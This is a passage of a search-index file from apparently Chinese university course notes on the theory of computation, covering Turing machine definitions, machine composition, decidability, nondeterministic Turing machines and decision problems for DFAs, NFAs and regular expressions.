K\\)\uff1a\u505c\u673a\u72b6\u6001\uff08halting state\uff09\u7684\u96c6\u5408</li> <li>\\(\\delta\\colon(K-H)\\times\\Sigma\\rightarrow K\\times(\\{\\leftarrow, \\rightarrow\\}\\cup (\\Sigma-\\{\\rhd\\}))\\)\uff1a\u8f6c\u79fb\u51fd\u6570\uff0c\u5176\u4e2d\uff1a<ul> <li>\\((K-H)\\)\uff1a\u975e\u505c\u673a\u72b6\u6001\uff0c\u505c\u673a\u72b6\u6001\u65e0\u6cd5\u518d\u8f6c\u79fb</li> <li>\\(\\Sigma\\)\uff1a\u8bfb\u5199\u5934\u8bfb\u5230\u7684\u7b26\u53f7</li> <li>\\(\\{\\leftarrow, \\rightarrow\\}\\)\uff1a\u8bfb\u5199\u5934\u5411\u5de6/\u53f3\u79fb\u52a8</li> <li>\\((\\Sigma-\\{\\rhd\\})\\)\uff1a\u8bfb\u5199\u5934\u5199\u5165\u7684\u7b26\u53f7\uff0c\u4e0d\u80fd\u5199\u5165 \\(\\rhd\\)</li> <li>\u9700\u8981\u6ee1\u8db3 \\(\\forall q\\in K, \\delta(q, \\rhd)=(p, \\rightarrow)\\) for some \\(p\\)</li> </ul> </li> </ul> </li> <li>configuration\uff1a\\(K\\times\\rhd(\\Sigma-\\{\\rhd\\})^*\\times(\\{e\\}\\cup(\\Sigma-\\{\\rhd\\})^*(\\Sigma-\\{\\rhd, \u2334\\}))\\)<ul> <li>\\(\\rhd(\\Sigma-\\{\\rhd\\})^*\\)\uff1a\u7eb8\u5e26\u4e0a\u5230\u8bfb\u5199\u5934\u4e3a\u6b62\u7684\u90e8\u5206\uff0c\\(\\rhd\\) \u5f00\u5934\uff0c\u6700\u540e\u4e00\u4e2a\u4e3a\u8bfb\u5199\u5934\u6307\u5411\u7684\u4f4d\u7f6e</li> <li>\\(\\{e\\}\\)\uff1a\u8bfb\u5199\u5934\u53f3\u4fa7\u6ca1\u6709\u975e\u7a7a\u683c\u5b50\u7684\u8bdd\u5c31\u662f \\(e\\)</li> <li>\\((\\Sigma-\\{\\rhd\\})^*(\\Sigma-\\{\\rhd, \u2334\\})\\)\uff1a\u8bfb\u5199\u5934\u53f3\u4fa7\u7684\u975e\u7a7a\u683c\u5b50</li> <li>e.g. \\((q, \\rhd\u2334ab, a)\\)\uff0c\u7b49\u4ef7\u53ef\u4ee5\u5199\u4e3a \\((q, \\rhd\u2334a\\underline{b}a)\\)\uff08\u4e0b\u5212\u7ebf\u8868\u793a\u8bfb\u5199\u5934\u6307\u5411\u7684\u4f4d\u7f6e\uff09</li> <li>\u521d\u59cb configuration\uff1a\\((s, ?)\\)\uff0c\u7eb8\u5e26\u5185\u5bb9\u4e0d\u540c\u573a\u5408\u6709\u4e0d\u540c\u7ea6\u5b9a</li> <li>\u505c\u673a configuration\uff1a\\((h, ?), h\\in H\\)\uff0c\u7eb8\u5e26\u5185\u5bb9\u65e0\u6240\u8c13</li> </ul> </li> <li>yields in one step / yields<ul> <li>\\((q_1, \\rhd w_1\\underline{a_1}u_1)\\vdash_M(q_2, \\rhd w_2\\underline{a_2}u_2)\\) if:<ul> <li>\\(\\delta(q_1, a_1) = (q_2, a_2),\\ w_1=w_2,\\ u_1=u_2\\)\uff1a\u5199\u7684\u60c5\u51b5</li> <li>\\(\\delta(q_1, a_1) = (q_2, \\leftarrow),\\ w_1=w_2a_2,\\ u_2 = a_1u_1\\)\uff1a\u5de6\u79fb\u7684\u60c5\u51b5<ul> <li>\u7279\u6b8a\u60c5\u51b5\uff1aif \\(a_1 = \u2334\\) and \\(u_1=e\\), \\(u_2=e\\)</li> </ul> </li> <li>\\(\\delta(q_1, a_1) = (q_2, \\rightarrow),\\ w_2=w_1a_1,\\ u_1 = u_2a_2\\)\uff1a\u53f3\u79fb\u7684\u60c5\u51b5</li> </ul> </li> <li>yields \u8fd8\u662f\u76f8\u7b49\u6216\u8005 yield \u4e00\u6b65\u6216\u66f4\u591a\u6b65</li> </ul> </li> </ul>"},{"location":"cs/tcs/toc/topic3/#_4","title":"\u6784\u5efa\u56fe\u7075\u673a","text":"<ul> <li>basic machines<ul> <li>symbol writing machine \\(M_a\\)\uff0c\u8bb0\u4e3a \\(a\\)<ul> <li>\u6548\u679c\uff1a\u5982\u679c\u5f53\u524d\u4f4d\u7f6e\u53ef\u5199\uff0c\u5c31\u5199\u5165 \\(a\\)\uff0c\u5982\u679c\u5f53\u524d\u4f4d\u7f6e\u662f \\(\\rhd\\) \u5c31\u53f3\u79fb\u4e00\u4f4d\u518d\u5199\u5165 \\(a\\)</li> <li>\u5b9a\u4e49 \\(M_a=(\\{s, h\\}, \\Sigma, \\delta, s, \\{h\\})\\)\uff0c\u5176\u4e2d \\(\\delta\\) \u5b9a\u4e49\u4e3a\uff1a<ul> <li>\\(\\delta(s, b) = (h, a)\\) for each \\(b\\in\\Sigma-\\{\\rhd\\}\\)</li> <li>\\(\\delta(s, \\rhd) = (s, \\rightarrow)\\)</li> </ul> </li> </ul> </li> <li>head moving machine \\(M_\\leftarrow, M_\\rightarrow\\) \u5206\u522b\u8bb0\u4e3a \\(L, R\\)<ul> <li>\u6548\u679c\uff1a\u8bfb\u5199\u5934\u5411\u5de6/\u53f3\u79fb\u52a8\u4e00\u4f4d\uff08\u5de6\u79fb\u7684\u8bdd\u5982\u679c\u5f53\u524d\u4f4d\u7f6e\u662f \\(\\rhd\\) \u5c31\u505c\u673a\uff09</li> <li>\u5b9a\u4e49 \\(M_\\leftarrow\\) \u7c7b\u4f3c \\(M_a\\)\uff0c\u5c06 \\(a\\) \u66ff\u6362\u4e3a \\(\\leftarrow\\) \u5373\u53ef</li> <li>\u5b9a\u4e49 \\(M_\\rightarrow\\) \u66f4\u4e3a\u7b80\u5355\uff0c\u4e0d\u9700\u8981\u8003\u8651 \\(\\rhd\\) \u7684\u60c5\u51b5</li> </ul> </li> </ul> </li> <li> <p>\u91c7\u7528\u4e00\u4e2a\u65b0\u7684\u8868\u793a\u65b9\u6cd5\uff0c\u7528\u6765\u8fde\u63a5\u56fe\u7075\u673a\u7684\u4f5c\u7528\u6784\u6210\u66f4\u590d\u6742\u7684\u56fe\u7075\u673a</p> <p> </p> <ul> <li>\u9996\u5148\u6267\u884c\u56fe\u7075\u673a \\(M_1\\) \u76f4\u5230\u505c\u673a</li> <li>\u68c0\u67e5\u505c\u673a\u72b6\u6001\u65f6\u5f53\u524d\u8bfb\u5199\u5934\u6307\u5411\u7684\u4f4d\u7f6e<ul> <li>\u5982\u679c\u662f 0 \u5219\u6267\u884c \\(M_2\\) \u76f4\u5230\u505c\u673a</li> <li>\u5982\u679c\u662f 1 \u5219\u6267\u884c \\(M_3\\) \u76f4\u5230\u505c\u673a</li> <li>\u5426\u5219\u76f4\u63a5\u505c\u673a</li> </ul> </li> <li>\u4e00\u4e9b\u7279\u6b8a\u7684\u8868\u793a\uff1a<ul> <li>\\(&gt;\\!\\!R\\overset{\\Sigma}{\\longrightarrow} R\\)\uff0c\u6216\u8bb0\u4e3a \\(&gt;\\!\\!RR, &gt;\\!\\!R^2\\)\uff0c\u53f3\u79fb\u4e24\u683c</li> <li>\\(&gt;\\!\\!R\\overset{a\\neq \u2334}{\\longrightarrow}Ra\\)\uff0c\u53f3\u79fb\uff0c\u5982\u679c\u4e0d\u4e3a\u7a7a\u5219 copy \u5230\u53f3\u4fa7\u683c\u5b50</li> <li>\\(&gt;\\!\\!R\\) \u6307\u5411\u81ea\u8eab\uff0c\u7bad\u5934\u4e0a\u662f \\(\\bar{\u2334}\\)\uff08\u8868\u793a\u975e\u7a7a\u683c\uff09\uff0c\u4f5c\u7528\u662f\u79fb\u52a8\u5230\u53f3\u4fa7\u7b2c\u4e00\u4e2a\u7a7a\u683c\u7684\u4f4d\u7f6e\uff0c\u8bb0\u4e3a \\(R_{\u2334}\\)</li> <li>\\(&gt;\\!\\!R\\) \u6307\u5411\u81ea\u8eab\uff0c\u7bad\u5934\u4e0a\u662f \\(\u2334\\)\uff0c\u4f5c\u7528\u662f\u79fb\u52a8\u5230\u53f3\u4fa7\u7b2c\u4e00\u4e2a\u975e\u7a7a\u683c\u7684\u4f4d\u7f6e\uff0c\u8bb0\u4e3a \\(R_{\\bar{\u2334}}\\)</li> <li>\u540c\u7406\u6709\u8bb0\u6cd5 \\(L_{\u2334}, L_{\\bar{\u2334}}\\)</li> </ul> </li> </ul> </li> </ul> \u6784\u5efa left shifting machine \\(S_\\leftarrow\\) <p>\u6548\u679c\u662f\u5bf9\u4e8e\u4efb\u610f \\(w\\in(\\Sigma-\\{\\rhd, \u2334\\})^*\\)\uff0c\u5c06 \\(\\rhd\u2334\u2334w\\underline{\u2334}\\) \u53d8\u4e3a \\(\\rhd\u2334w\\underline{\u2334}\\)</p> <p> </p> <p>\u6700\u53f3\u4fa7\u7684\u56fe\u7075\u673a \\(\u2334LaR\\) \u8868\u793a\u5148\u6e05\u7a7a\u5f53\u524d\u683c\uff0c\u7136\u540e\u5de6\u79fb\uff0c\u5c06\u521a\u8bfb\u53d6\u5230\u7684\u5b57\u7b26\u5199\u5165\uff0c\u7136\u540e\u518d\u53f3\u79fb\u56de\u6765</p>"},{"location":"cs/tcs/toc/topic3/#_5","title":"\u56fe\u7075\u673a\u529f\u80fd","text":"<ul> <li>Recognize language<ul> <li>\u56fe\u7075\u673a\u57fa\u7840\u4e0a\u8865\u52a0\u4e00\u4e2a\u96c6\u5408 \\(\\Sigma_0\\subseteq \\Sigma-\\{\\rhd, \u2334\\}\\) \u8868\u793a\u8f93\u5165\u7684\u5b57\u7b26\u96c6</li> <li>\u5b9a\u4e49\u8d77\u59cb configuration \u4e3a \\((s, \\rhd\\underline{\u2334}w)\\)\uff0c\u5176\u4e2d \\(w\\) \u4e3a\u8f93\u5165\u5b57\u7b26\u4e32</li> <li>\u534a\u5224\u5b9a\uff08semidecides\uff09<ul> <li>\\(M\\) semidecides \\(L(M)=\\{w\\in\\Sigma_0^*: (s, \\rhd\\underline{\u2334}w)\\vdash_M^*(h, \\rhd u)\\}\\)\uff0c\u5176\u4e2d \\(h\\in H, u\\in\\Sigma^*\\)</li> <li>\u8bed\u8a00\u4e2d\u7684\u5b57\u7b26\u4e32\u4f1a\u505c\u673a\uff0c\u4e0d\u5c5e\u4e8e\u8bed\u8a00\u7684\u5b57\u7b26\u4e32\u4e0d\u505c\u673a</li> <li>\u201c\u534a\u201d\u7684\u539f\u56e0\uff1a\u5224\u5b9a\u65f6\u95f4\u5f88\u957f\u7684\u8bdd\u4e0d\u77e5\u9053\u5230\u5e95\u6700\u540e\u4f1a\u4e0d\u4f1a\u505c\u673a</li> </ul> </li> <li>\u5224\u5b9a\uff08decides\uff09<ul> <li>\u4ee4 \\(M=(K, \\Sigma_0, \\Sigma, \\delta, s, \\{y, n\\})\\)\uff0c\\(M\\) decides a language \\(L\\subseteq \\Sigma_0^*\\) if:<ul> <li>\\(\\forall w\\in L\\), \\((s, \\rhd\\underline{\u2334}w)\\vdash_M^*(y, \\cdots)\\)\uff0c\u79f0 \\(M\\) accepts \\(w\\)</li> <li>\\(\\forall w\\in \\Sigma_0^*-L\\), \\((s, \\rhd\\underline{\u2334}w)\\vdash_M^*(n, \\cdots)\\)\uff0c\u79f0 \\(M\\) rejects \\(w\\)</li> </ul> </li> <li>\u4e0d\u7ba1\u63a5\u4e0d\u63a5\u53d7\u90fd\u4f1a\u505c\u673a\uff0c\u53ea\u4e0d\u8fc7\u505c\u673a\u7684\u72b6\u6001\u4e0d\u540c</li> </ul> </li> <li>\u6709\u56fe\u7075\u673a\u5224\u5b9a\u4e00\u4e2a\u8bed\u8a00\uff0c\u5219\u79f0\u8fd9\u4e2a\u8bed\u8a00\u662f recursive / decidable \u7684</li> <li>\u6709\u56fe\u7075\u673a\u534a\u5224\u5b9a\u4e00\u4e2a\u8bed\u8a00\uff0c\u5219\u79f0\u8fd9\u4e2a\u8bed\u8a00\u662f recursively enumerable / recognizable \u7684</li> <li>\u5b9a\u7406\uff1a\u5982\u679c\u4e00\u4e2a\u8bed\u8a00\u662f recursive \u7684\uff0c\u5219\u5b83\u662f recursively enumerable \u7684<ul> <li>\u7ed9 \\(n\\) \u7684\u505c\u673a\u72b6\u6001\u53d8\u6210\u4e00\u4e2a\u5faa\u73af\u4e0d\u505c\u673a\u7684\u72b6\u6001\u5c31\u53ef\u4ee5</li> </ul> </li> </ul> </li> <li>Compute function<ul> <li>\u5bf9\u4e8e \\(w\\in\\Sigma_0^*\\)\uff0c\u5982\u679c \\((s, \\rhd\\underline{\u2334}w)\\vdash_M^*(h, \\rhd\\underline{\u2334}y)\\)\uff08\u5176\u4e2d \\(h\\in H, y\\in\\Sigma_0^*\\)\uff09\uff0c\u5219\u79f0 \\(y=M(w)\\) \u4e3a\u56fe\u7075\u673a\u5728\u8f93\u5165 \\(w\\) \u65f6\u7684\u8f93\u51fa</li> <li>\u5bf9\u4e8e\u4efb\u610f\u51fd\u6570 \\(f\\colon\\Sigma_0^*\\rightarrow\\Sigma_0^*\\)\uff0c\u5982\u679c\u5b58\u5728\u56fe\u7075\u673a \\(M\\) \u4f7f\u5f97 \\(M(w)=f(w)\\)\uff0c\u5219\u79f0<ul> <li>\\(M\\) computes \\(f\\)</li> <li>\\(f\\) \u662f recursive / computable \u7684</li> </ul> </li> </ul> </li> </ul> \u8bc1\u660e \\(L=\\{a^nb^nc^n:n\\geq 0\\}\\) \u662f recursive \u7684 <p>\u6784\u9020\u56fe\u7075\u673a\uff0c\u601d\u8def\uff1a\u6bcf\u6b21\u4ece\u5de6\u5230\u53f3\u4f9d\u6b21\u5220\u4e00\u7ec4 abc\uff0c\u6539\u4e3a x\uff0c\u7136\u540e\u68c0\u6d4b\u6700\u540e\u662f\u5426\u90fd\u662f x\uff1a</p> <p> </p> <p>\u4f46\u8fd9\u79cd\u60c5\u51b5\u4f1a\u63a5\u53d7 \\(abcabc\\)\uff0c\u6240\u4ee5\u9700\u8981\u5220 \\(abc\\) \u4e4b\u540e\u5206\u522b\u53d8\u4e3a \\(xyz\\)\uff0c\u7136\u540e\u518d\u68c0\u6d4b\uff1a</p> <p> </p>"},{"location":"cs/tcs/toc/topic3/#_6","title":"\u53d8\u79cd\u56fe\u7075\u673a","text":"<p>\u4e00\u4e9b\u6269\u5c55\u5f62\u5f0f\u7684\u56fe\u7075\u673a\uff0c\u6709\u66f4\u65b9\u4fbf\u7684\u529f\u80fd\uff0c\u4f46\u5b9e\u9645\u4e0a\u90fd\u53ef\u4ee5\u7528\u6807\u51c6\u56fe\u7075\u673a\u6765\u5b9e\u73b0\u540c\u6837\u6548\u679c</p> <ul> <li>multiple tapes \u591a\u5e26\u56fe\u7075\u673a<ul> <li>\u6709 \\(k\\) \u6761\u7eb8\u5e26\uff0c\u6bcf\u6b21\u6839\u636e \\(k\\) \u4e2a\u8bfb\u5199\u5934\u7684\u4fe1\u606f\u8fdb\u884c\u5224\u65ad<ul> <li>\\(\\delta\\colon (K-H)\\times\\Sigma^k\\rightarrow K\\times ((\\Sigma-\\{\\rhd\\})\\cup \\{\\leftarrow, \\rightarrow\\})\\)</li> </ul> </li> <li>\ud83d\udca1\u8f6c\u6362\u4e3a\u6807\u51c6\u56fe\u7075\u673a\u7684 idea<ul> <li>\u6bd4\u5982\u6709\u4e09\u4e2a\u7eb8\u5e26 \\(\\rhd a\\underline{b}a\u2334\\)\uff0c\\(\\rhd ba\\underline{a}\u2334\\)\uff0c\\(\\rhd \\underline{b}a\u2334\\)</li> <li>\u5219\u6784\u5efa\u7eb8\u5e26 \\(\\rhd (ab\\underline{b})(\\underline{b}aa)(a\\underline{a}\u2334)(\u2334\u2334\u2334)\\)</li> <li>\u6bcf\u6b21\u8bfb\u53d6\u6240\u6709\u5e26\u4e0b\u5212\u7ebf\u7684\u7b26\u53f7\uff0c\u518d\u8fdb\u884c\u5224\u65ad/\u66f4\u6539</li> </ul> </li> </ul> </li> <li>two-way infinite tape \u7eb8\u5e26\u4e24\u4fa7\u90fd\u65e0\u9650\u957f\u7684\u56fe\u7075\u673a<ul> <li>\ud83d\udca1\u53ef\u4ee5\u7528\u53cc\u5e26\u56fe\u7075\u673a\u6a21\u62df\uff0c\u4e5f\u5c31\u53ef\u4ee5\u7528\u6807\u51c6\u56fe\u7075\u673a\u6a21\u62df</li> </ul> </li> <li>multiple head \u591a\u8bfb\u5199\u5934\u56fe\u7075\u673a<ul> <li>\ud83d\udca1\u7528\u4e0b\u5212\u7ebf\u6807\u8bb0\u6bcf\u4e2a\u5934\u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u6bcf\u6b21\u626b\u63cf\u6240\u6709\u5934</li> </ul> </li> <li>2-dimensional tape \u4e8c\u7ef4\u7eb8\u5e26\u56fe\u7075\u673a<ul> <li>\ud83d\udca1\u4ece\u5de6\u4e0a\u89d2\u5f00\u59cb\u6cbf\u53cd\u5bf9\u89d2\u7ebf\u7f16\u53f7\uff0c\u5ef6\u5c55\u6210\u4e00\u7ef4\u7eb8\u5e26</li> </ul> </li> <li>random access \u968f\u673a\u8bbf\u95ee\u56fe\u7075\u673a<ul> <li>\u6bcf\u6b21\u79fb\u52a8\u8bfb\u5199\u5934\u53ef\u4ee5\u4e0d\u6b62\u4e00\u6b65</li> <li>\ud83d\udca1\u5c06\u591a\u6b65\u79fb\u52a8\u62c6\u6210\u591a\u6b21\u5355\u6b65\u79fb\u52a8\u5373\u53ef</li> </ul> </li> <li>non-deterministic TM \u975e\u786e\u5b9a\u6027\u56fe\u7075\u673a\uff08NTM\uff09<ul> <li>\u89c1\u4e0b</li> </ul> </li> </ul>"},{"location":"cs/tcs/toc/topic3/#_7","title":"\u975e\u786e\u5b9a\u6027\u56fe\u7075\u673a","text":"<ul> <li>\u5b9a\u4e49\u4e3a\u4e00\u4e2a\u4e94\u5143\u7ec4 \\((K, \\Sigma, \\Delta, s, H)\\)<ul> <li>\\(K, \\Sigma, s, H\\) \u548c\u786e\u5b9a\u6027\u56fe\u7075\u673a\u4e00\u6837</li> <li>\\(\\Delta\\): a finite subset of \\(\\big((K-H)\\times\\Sigma\\big)\\times\\big(K\\times((\\Sigma-\\{\\rhd\\})\\cup\\{\\leftarrow,\\rightarrow\\})\\big)\\)</li> </ul> </li> <li>configuration\u3001\\(\\vdash_M\\)\u3001\\(\\vdash_M^*\\) \u548c\u786e\u5b9a\u6027\u56fe\u7075\u673a\u5b9a\u4e49\u5b8c\u5168\u76f8\u540c</li> <li>\u5b9a\u4e49 \\(\\vdash_M^N\\) \u4e3a\u6267\u884c \\(N\\) \u6b65\u53ef\u4ee5\u5230\u8fbe</li> <li>\u534a\u5224\u5b9a\uff1a<ul> <li>\u7ed9\u5b9a NTM \\(M\\) \u5176\u8f93\u5165\u7b26\u53f7\u96c6\u4e3a \\(\\Sigma_0\\)</li> <li>\\(M\\) semidecides \\(L\\subseteq \\Sigma_0^*\\) if for any \\(w\\in\\Sigma_0^*\\), \\(w\\in L\\) iff \\((s, \\rhd\\underline{\u2334}w)\\vdash_M^*(h,\\cdots)\\) for some \\(h\\in H\\)</li> <li>\u5982\u679c \\(w\\in L\\) \u5219 NTM \u6709\u5206\u652f\u53ef\u4ee5\u505c\u673a\uff0c\u5426\u5219\u6ca1\u6709\u5206\u652f\u53ef\u4ee5\u505c\u673a</li> </ul> </li> <li>\u5224\u5b9a\uff1a<ul> <li>\u4ee4 \\(M=(K,\\Sigma,\\Delta,s,\\{y,n\\})\\)\uff0c\u8f93\u5165\u7b26\u53f7\u96c6 \\(\\Sigma_0\\)</li> <li>\\(M\\) decides a language \\(L\\subseteq \\Sigma_0^*\\) if<ul> <li>for any \\(w\\in\\Sigma_0^*\\), exists a natural number \\(N\\), s.t. no configuration \\(c\\) satisfying \\((s, \\rhd\\underline{\u2334}w)\\vdash_M^N c\\)<ul> <li>\u8bf4\u660e\u5728 \\(N\\) \u6b65\u5185\u90fd\u53ef\u4ee5\u505c\u673a\uff0c\u975e\u786e\u5b9a\u4ea7\u751f\u7684\u6811\u9ad8\u5ea6\u5c0f\u4e8e \\(N\\)</li> </ul> </li> <li>\\(w\\in L\\) iff \\((s, \\rhd\\underline{\u2334}w)\\vdash_M^*(y,\\cdots)\\)<ul> <li>\u975e\u786e\u5b9a\u6267\u884c\u7684\u6811\u4e0a\u6709\u4e00\u6761\u5206\u652f\u53ef\u4ee5\u505c\u673a\u5230 \\(y\\) \u72b6\u6001</li> </ul> </li> </ul> </li> </ul> </li> </ul> \u6784\u9020 NTM \u5224\u5b9a\u6240\u6709\u5408\u6570\uff08\u975e\u8d28\u6570\uff09\u7684\u4e8c\u8fdb\u5236\u7f16\u7801\u6784\u6210\u7684\u8bed\u8a00 <p>\u5229\u7528 NTM \u53ef\u4ee5\u201c\u731c\u6d4b\u201d\u7684\u7279\u6027\uff0c\u76ee\u6807\u662f\u731c\u6d4b\u6709\u6ca1\u6709\u4e24\u4e2a\u6570\u76f8\u4e58\u7b49\u4e8e\u8f93\u5165\u3002</p> <p>\u5047\u8bbe\u8f93\u5165\u5b57\u7b26\u4e32\u4e3a \\(w\\)\uff0c\u5219\u5148\u731c\u6d4b\u4e24\u4e2a\u6570\uff0c\u5f97\u5230 \\(\\rhd\u2334w\u2334p\u2334q\\)\uff0c\u7136\u540e\u5c06 \\(p\\) \u548c \\(q\\) \u76f8\u4e58\uff0c\u5982\u679c\u7b49\u4e8e \\(w\\) \u5219\u505c\u673a\u5230 \\(y\\)\uff0c\u5426\u5219\u505c\u673a\u5230 \\(n\\)\uff0c\u6ee1\u8db3\u7b2c\u4e8c\u4e2a\u6761\u4ef6\u3002</p> <p>\u56e0\u4e3a \\(p,q\\) \u90fd\u5c0f\u4e8e \\(w\\)\uff0c\u6240\u4ee5\u731c\u6d4b\u662f\u6709\u9650\u7684\uff0c\u800c\u4e14\u90fd\u53ef\u4ee5\u6709\u9650\u6b65\u505c\u673a\uff0c\u6ee1\u8db3\u7b2c\u4e00\u4e2a\u6761\u4ef6\u3002</p> <p>Theorem. Every NTM can be simulated by DTM.</p> <ul> <li>Proof Sketch\uff08\u4ee5\u534a\u5224\u5b9a\u4e3a\u4f8b\uff09<ul> <li>Idea\uff1aNTM \u6267\u884c\u65f6\u7684\u591a\u79cd\u9009\u62e9\u4f1a\u751f\u6210\u4e00\u9897\u6811\uff0cDTM \u8981\u505a\u7684\u662f BFS \u641c\u7d22\u8fd9\u68f5\u6811\u76f4\u5230\u627e\u5230\u505c\u673a\u72b6\u6001</li> <li>\u7528 3-tape DTM \u6765\u6a21\u62df NTM<ul> <li>\u7b2c\u4e00\u6761\u7528\u6765\u88c5\u8f93\u5165 \\(\\rhd\u2334w\\)</li> <li>\u7b2c\u4e8c\u6761\u7528\u6765\u6a21\u62df NTM \\(N\\)\uff08\u5728\u6811\u4e0a\u5411\u4e0b\u8d70\uff09</li> <li>\u7b2c\u4e09\u6761\u7528\u6765\u679a\u4e3e\u201c\u63d0\u793a\u201d\uff0c\u6307\u5bfc\u7b2c\u4e8c\u6761\u7eb8\u5e26\u91cc\u9762\u5728\u6811\u4e0a\u600e\u4e48\u8d70</li> </ul> </li> <li>\u6b65\u9aa4\uff1a<ul> <li>\u6bcf\u4e00\u8f6e\u5f00\u59cb\u65f6\u5c06\u7b2c\u4e00\u6761\u7eb8\u5e26 copy \u5230\u7b2c\u4e8c\u6761\u7eb8\u5e26\u4e0a</li> <li>\u66f4\u65b0\u7b2c\u4e09\u6761\u7eb8\u5e26\uff0c\u6307\u6325\u7b2c\u4e8c\u6761\u7eb8\u5e26\u6a21\u62df NTM \u7684\u6811\u65f6\u6bcf\u4e00\u6b65\u8be5\u91c7\u7528\u54ea\u4e2a\u8f6c\u6362</li> <li>\u7b2c\u4e09\u6761\u7eb8\u5e26\u5185\u5bb9\u90fd\u8bfb\u53d6\u7ed3\u675f\u540e\uff0c\u5224\u5b9a\u7b2c\u4e8c\u6761\u7eb8\u5e26\u4e0a\u6a21\u62df\u7684\u4f4d\u7f6e\u662f\u5426\u505c\u673a<ul> <li>\u5982\u679c\u505c\u673a\u5219\u7ed3\u675f</li> <li>\u6ca1\u505c\u673a\u5219\u5f00\u59cb\u65b0\u7684\u4e00\u8f6e\uff0c\u91c7\u7528\u4e0d\u540c\u7684\u7b2c\u4e09\u6761\u7eb8\u5e26\u5185\u5bb9</li> </ul> </li> </ul> </li> <li>e.g. \u7b2c\u4e09\u6761\u7eb8\u5e26\u5185\u5bb9\u4e3a \\(\\rhd\u23340\\) \u5219\u53ea\u5411\u5de6\u4e00\u6b65\uff0c\\(\\rhd\u2334010\\) \u5219\u8d70\u5de6\u53f3\u5de6\u4e09\u6b65\u518d\u68c0\u6d4b\u662f\u5426\u505c\u673a</li> </ul> </li> </ul>"},{"location":"cs/tcs/toc/topic4/","title":"\u5224\u5b9a\u95ee\u9898","text":"<p> \u7ea6 3781 \u4e2a\u5b57  2 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f</p> <p>Abstract</p> <p>\u7406\u8bba\u8ba1\u7b97\u673a\u79d1\u5b66\u5bfc\u5f15\u7b2c\u4e5d\u81f3\u7b2c\u5341\u4e00\u5468\u8bfe\u7a0b\u5185\u5bb9</p>"},{"location":"cs/tcs/toc/topic4/#church-turing-thesis","title":"Church-Turing Thesis","text":"<p>Intuition of algorithms equals (deterministic) Turing machine that halts on every input. \u5373\u7b97\u6cd5\u672c\u8d28\u4e0a\u5c31\u662f\u56fe\u7075\u673a\u3002\u7b97\u6cd5\u7528\u6765\u89e3\u51b3\uff08\u5224\u5b9a\uff09\u95ee\u9898\uff0c\u800c\u56fe\u7075\u673a\u53ef\u4ee5\u5224\u5b9a\u8bed\u8a00\uff0c\u4e8c\u8005\u662f\u7b49\u4ef7\u7684\u3002</p>"},{"location":"cs/tcs/toc/topic4/#_2","title":"\u7f16\u7801\u4e0e\u5224\u5b9a\u95ee\u9898","text":"<ul> <li>Any finite set can be encoded</li> <li>A finite collection of finite sets can be encoded<ul> <li>FA, PDA, CFG, REX, TM \u90fd\u53ef\u4ee5\u88ab\u7f16\u7801</li> </ul> </li> <li>\u5bf9\u4e8e \\(O\\)\uff0c\u6211\u4eec\u7528 \\(\\texttt{\"}O\\texttt{\"}\\) \u8868\u793a\u5176\u7f16\u7801</li> <li>decide problem &lt;=&gt; recursive languages\uff08\u53ef\u5224\u5b9a\uff09</li> </ul> \u5224\u5b9a\u95ee\u9898 \\(R_1\\) <p>\\(A_{\\text{DFA}}=\\{\\texttt{\"}D\\texttt{\"}\\texttt{\"}w\\texttt{\"}: D\\text{ is a DFA that accpets }w\\}\\)</p> <p>\u8bbe\u8ba1\u4e00\u4e2a\u56fe\u7075\u673a \\(M_{R_1}\\) \u5224\u5b9a\u8fd9\u4e2a\u95ee\u9898\uff0c\u8f93\u5165\u4e3a \\(\\texttt{\"}D\\texttt{\"}\\texttt{\"}w\\texttt{\"}\\)</p> <ol> <li>\u9ed8\u8ba4\u7684\u5224\u65ad\uff08\u4ee5\u540e\u4e0d\u518d\u91cd\u590d\u5199\uff09<ol> <li>\u5982\u679c\u8f93\u5165\u662f\u975e\u6cd5\u7684\uff0c\u5219 reject</li> <li>\u5982\u679c\u8f93\u5165\u662f\u5408\u6cd5\u7684\uff0c\u5219\u8fdb\u884c\u89e3\u7801\uff0c\u5f97\u5230 \\(D\\) \u548c \\(w\\)</li> </ol> </li> <li>run \\(D\\) on \\(w\\)</li> <li>if \\(D\\) ends with final (\\(D\\) accept \\(w\\))</li> <li>\u2003\u2003accept \\(\\texttt{\"}D\\texttt{\"}\\texttt{\"}w\\texttt{\"}\\)</li> <li>else</li> <li>\u2003\u2003reject</li> </ol> \u5224\u5b9a\u95ee\u9898 \\(R_2\\) <p>\\(A_{\\text{NFA}}\\)\uff0c\u5373 NFA \\(N\\) \u662f\u5426\u63a5\u53d7\u5b57\u7b26\u4e32 \\(w\\)</p> <p>\\(M_{R_2}\\) = on input \\(\\texttt{\"}N\\texttt{\"}\\texttt{\"}w\\texttt{\"}\\)</p> <ol> <li>\\(N\\) -&gt; an equivalent DFA \\(D\\)</li> <li>run \\(M_{R_1}\\) on \\(\\texttt{\"}D\\texttt{\"}\\texttt{\"}w\\texttt{\"}\\)</li> <li>return the result of \\(M_{R_1}\\)</li> </ol> <p>\\(\\texttt{\"}N\\texttt{\"}\\texttt{\"}w\\texttt{\"}\\in A_{\\text{NFA}}\\) &lt;=&gt; \\(\\texttt{\"}D\\texttt{\"}\\texttt{\"}w\\texttt{\"}\\in A_{\\text{DFA}}\\) \u79f0\u4e3a a reduction from \\(A_{\\text{NFA}}\\) to \\(A_{\\text{DFA}}\\)\uff0c\u5373\u89c4\u7ea6</p> \u5224\u5b9a\u95ee\u9898 \\(R_3\\) (\\(A_{\\text{REX}}\\)) <p>\\(A_{\\text{REX}}=\\{\\texttt{\"}R\\texttt{\"}\\texttt{\"}w\\texttt{\"}: R\\text{ is a regular expression that generates }w\\}\\)</p> <p>\\(M_{R_3}\\) = on input \\(\\texttt{\"}R\\texttt{\"}\\texttt{\"}w\\texttt{\"}\\)</p> <ol> <li>\\(R\\) -&gt; an equivalent NFA \\(N\\)</li> <li>run \\(M_{R_2}\\) on \\(\\texttt{\"}N\\texttt{\"}\\texttt{\"}w\\texttt{\"}\\)</li> <li>return the result of \\(M_{R_2}\\)</li> </ol> \u5224\u5b9a\u95ee\u9898 \\(R_4\\) (\\(E_{\\text{DFA}}\\)) <p>\\(E_{\\text{DFA}}=\\{\\texttt{\"}D\\texttt{\"}: D\\text{ is a DFA with }L(D)=\\emptyset\\}\\)</p> <p>\\(M_{R_4}\\) = on input \\(\\texttt{\"}D\\texttt{\"}\\)</p> <ol> <li>if \\(D\\) has no final 